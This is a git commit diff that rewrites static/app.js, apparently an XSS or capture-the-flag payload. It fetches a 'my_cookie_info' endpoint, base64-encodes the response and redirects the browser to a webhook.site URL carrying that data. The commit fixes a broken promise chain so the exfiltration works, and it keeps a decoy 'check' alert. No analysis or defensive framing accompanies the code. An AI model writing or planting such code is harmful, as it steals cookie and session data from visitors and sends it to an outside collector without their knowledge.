9a52bf6ff6f5d0740bf366c58a3302a9065a14c9
Xiamong <qw050325@naver.com>
2024-09-19 01:07:09 +0900

    Update app.js

--- static/app.js
+++ static/app.js
@@ -1,11 +1,12 @@
-let htmlText='';
-const request=new XMLHttpRequest();
-fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res =>htmlText=res.json.str(););
-setTimeout(function(){
-      const aba = btoa(htmlText);
-      location.href="https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/"+btoa(htmlText);
-},1000);
-setTimeout(function(){
-      alert('cheak');
-},1000);
+let htmlText = '';
+fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info')
+  .then(res => res.json())
+  .then(data => {
+    htmlText = JSON.stringify(data); // 객체를 문자열로 변환
+    const encodedText = btoa(htmlText);
+    location.href = "https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/" + encodedText;
+  });
 
+setTimeout(function() {
+  alert('check'); // 'cheak' -> 'check'로 수정
+}, 1000);
